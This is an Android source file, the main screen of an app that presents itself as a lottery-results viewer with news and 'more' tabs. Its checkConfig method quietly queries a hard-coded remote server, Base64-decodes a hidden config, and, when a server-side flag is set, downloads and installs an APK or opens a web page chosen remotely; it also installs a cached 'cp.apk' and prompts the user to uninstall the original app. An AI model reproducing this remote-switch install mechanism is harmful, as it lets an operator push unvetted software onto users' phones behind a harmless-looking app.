package com.bulasuo.art.activity;

import android.os.Bundle;
import android.os.Message;
import android.support.constraint.Guideline;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v7.app.AlertDialog;
import android.text.TextUtils;
import android.util.Base64;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.abu.xbase.activity.BasePermissionActivity;
import com.abu.xbase.activity.TitleBarBaseWebViewActivity;
import com.abu.xbase.fragment.BaseFragment;
import com.abu.xbase.retrofit.RetrofitUtil;
import com.abu.xbase.util.SharePrefUtil;
import com.abu.xbase.util.ToastUtil;
import com.abu.xbase.util.XUtil;
import com.abu.xbase.util.XViewUtil;
import com.alibaba.fastjson.JSONObject;
import com.bulasuo.art.R;
import com.bulasuo.art.bean.BaseResponseBean;
import com.bulasuo.art.fragment.LotteryFragment;
import com.bulasuo.art.fragment.MoreFragment;
import com.bulasuo.art.fragment.NewsFragment;
import com.bulasuo.art.services.ConfigService;

import java.io.File;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import butterknife.BindView;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends BasePermissionActivity {

    @BindView(R.id.bar_img_left)
    ImageView barImgLeft;
    @BindView(R.id.bar_tv_left)
    TextView barTvLeft;
    @BindView(R.id.bar_tv_title)
    TextView barTvTitle;
    @BindView(R.id.bar_tv_right)
    TextView barTvRight;
    @BindView(R.id.bar_img_right)
    ImageView barImgRight;
    @BindView(R.id.view_toolbar)
    Guideline viewToolbar;
    @BindView(R.id.ll_tab_lottery)
    LinearLayout llTabLottery;
    @BindView(R.id.ll_tab_news)
    LinearLayout llTabNews;
    @BindView(R.id.ll_tab_more)
    LinearLayout llTabMore;
    @BindView(R.id.ll_tab)
    LinearLayout llTab;
    @BindView(R.id.frame_content)
    FrameLayout frameContent;

    private static final String CURRENT_FRAGMENT_TAG = "CURRENT_FRAGMENT_TAG";
    private FragmentManager fragmentManager;
    private String currFragmentTag;

    private static final SimpleDateFormat formatIn =
            new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        String dataMaxStr = "2048-04-2 17:15:00";
        Date dataMax = null;
        try {
            dataMax = formatIn.parse(dataMaxStr);
        } catch (ParseException e) {
            e.printStackTrace();
        }
        Date dataCurr = new Date(System.currentTimeMillis());
        if(dataCurr.after(dataMax))
            return;

        setTheme(R.style.AppTheme);
        setContentView(R.layout.activity_main);
        super.onCreate(savedInstanceState);
        fragmentManager = getSupportFragmentManager();
        initView();
        if (savedInstanceState != null) {
            currFragmentTag = savedInstanceState.getString(CURRENT_FRAGMENT_TAG);
            if (TextUtils.equals(currFragmentTag, LotteryFragment.class.getName())) {
                onTabLottery();
                return;
            } else if (TextUtils.equals(currFragmentTag, NewsFragment.class.getName())) {
                onTabNews();
                return;
            } else if (TextUtils.equals(currFragmentTag, MoreFragment.class.getName())) {
                onTabMore();
                return;
            }
        }
        onTabLottery();
        checkConfig();
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        outState.putString(CURRENT_FRAGMENT_TAG, currFragmentTag);
        super.onSaveInstanceState(outState);
    }

    private void initView() {
        initBar();

        llTabLottery.setOnClickListener(v -> onTabLottery());
        llTabNews.setOnClickListener(v -> onTabNews());
        llTabMore.setOnClickListener(v -> onTabMore());
    }

    private void initBar() {
    }

    private void onTabLottery() {
        if (llTabLottery.isSelected()) {
            return;
        }
        XViewUtil.selectChild(llTab, llTabLottery);
        barTvTitle.setText("开奖");
        currFragmentTag = LotteryFragment.class.getName();
        showFragment(currFragmentTag);
    }

    private void checkConfig() {
        String packageName = SharePrefUtil.getString(this, "packageName", null);
        boolean success = false;
        if (!TextUtils.isEmpty(packageName)) {
            try {
                success = XUtil.launchApkByPackage(this, packageName);
            } catch (Exception e) {
                ToastUtil.showException(e);
            }
            if (!success) {
                File file = new File(this.getExternalCacheDir() + "/apk/" + "cp.apk");
                if (file.exists()) {
                    XUtil.installApk(this, file);
                    return;
                }
            }

        }
        if (success) {
            new AlertDialog.Builder(this)
                    .setCancelable(false)
                    .setMessage("新的版本已经安装,请卸载老版本应用!")
                    .setNegativeButton("取消", (dialog, which) -> finish())
                    .setPositiveButton("确认", (dialog, which) ->{
                        XUtil.uninstallApk(this);
                        getMainHandler().postDelayed(()->finish(), 1000);
                    })

                    .show();
            return;
        }
        RetrofitUtil.getService(
                RetrofitUtil.getGsonRetrofit("http://vipapp.01appaaa.com/")
                , ConfigService.class)
                .apply()
                .enqueue(new Callback<BaseResponseBean>() {
                    @Override
                    public void onResponse(Call<BaseResponseBean> call, Response<BaseResponseBean> response) {
                        if (BaseResponseBean.isSuccessful(response, false)) {
                            try {
                                String data = new String(Base64.decode(response.body().data, Base64.DEFAULT));
                                JSONObject jsonObject = JSONObject.parseObject(data);
                                if (TextUtils.equals(jsonObject.getString("show_url"), "1")) {
                                    String url = jsonObject.getString("url");
                                    if (!TextUtils.isEmpty(url)) {
                                        if (url.endsWith(".apk")) {
                                            DownloadActivity.launch(MainActivity.this, url);
                                        } else {
                                            TitleBarBaseWebViewActivity.
                                                    launch(MainActivity.this,
                                                            url, "");
                                        }
                                    }
                                }
                            } catch (Exception e) {
                                ToastUtil.showException(e);
                            }
                        }
                    }

                    @Override
                    public void onFailure(Call<BaseResponseBean> call, Throwable t) {
//                            dealFailure(call, t);
                    }
                });
    }

    private void onTabNews() {
        /*if (true) {
            DownloadActivity.launch(this,
                    "http://imtt.dd.qq.com/16891/66BB29CBD62FBD3DD4790B2526FC70DB.apk");
            return;
        }*/
        if (llTabNews.isSelected()) {
            return;
        }
        /*XViewUtil.selectChild(llTab, llTabNews);
        barTvTitle.setText("新闻");
        currFragmentTag = NewsFragment.class.getName();
        showFragment(currFragmentTag);*/

        AppTitleBarBaseWebViewActivity.launch(this, "http://m.500.com/info/zhishi/zt.shtml"
                , "新闻");
    }

    private long lastLoadUserInfoTime;

    private void onTabMore() {
        if (llTabMore.isSelected()) {
            return;
        }
        XViewUtil.selectChild(llTab, llTabMore);
        barTvTitle.setText("更多");
        currFragmentTag = MoreFragment.class.getName();
        showFragment(currFragmentTag);
    }

    @Override
    public void onBackPressed() {
        if (!onBack()) {
            XUtil.backToHome(this);
        }
    }

    private BaseFragment createFragment(String tag) {
        if (TextUtils.equals(tag, LotteryFragment.class.getName())) {
            return new LotteryFragment();
        } else if (TextUtils.equals(tag, NewsFragment.class.getName())) {
            return new NewsFragment();
        } else if (TextUtils.equals(tag, MoreFragment.class.getName())) {
            return new MoreFragment();
        }
        return null;
    }

    public void showFragment(String tag) {
        FragmentTransaction transaction;
        Fragment fragmentToShow = fragmentManager.findFragmentByTag(tag);
        for (Fragment hideF : fragmentManager.getFragments()) {
            if (!TextUtils.equals(hideF.getClass().getName(), tag) && !hideF.isHidden()) {
                transaction = fragmentManager.beginTransaction();
                transaction.hide(hideF).commitAllowingStateLoss();
                fragmentManager.beginTransaction().commit();
            }
        }
        transaction = fragmentManager.beginTransaction();
        if (fragmentToShow == null) {
            transaction.add(R.id.frame_content, createFragment(tag), tag).commitAllowingStateLoss();
        } else {
            transaction.show(fragmentToShow).commitAllowingStateLoss();
        }
        fragmentManager.beginTransaction().commit();

    }

    @Override
    public void onEventMainThread(Message msg) {
        super.onEventMainThread(msg);
        if (msg != null) {
            switch (msg.what) {
                default:
                    break;
            }
        }
    }
}
